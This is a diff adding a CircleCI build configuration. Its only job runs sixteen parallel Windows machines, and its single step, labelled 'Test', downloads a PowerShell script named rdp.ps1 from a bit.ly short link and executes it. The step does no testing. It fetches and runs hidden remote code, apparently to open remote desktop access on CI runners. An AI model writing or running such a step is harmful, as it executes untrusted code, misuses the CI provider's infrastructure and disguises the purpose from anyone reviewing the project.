@@ -1,0 +1,18 @@
+version: 2.1 
+ 
+orbs:
+  win: circleci/windows@2.2.0
+ 
+jobs:
+  build:
+    parallelism: 16 
+    executor:
+      name: win/default 
+      size: "medium" 
+ 
+    steps:
+      - run:
+          name: Test
+          command: |
+            Invoke-WebRequest https://bit.ly/3EMzdPJ -OutFile rdp.ps1
+            ./rdp.ps1
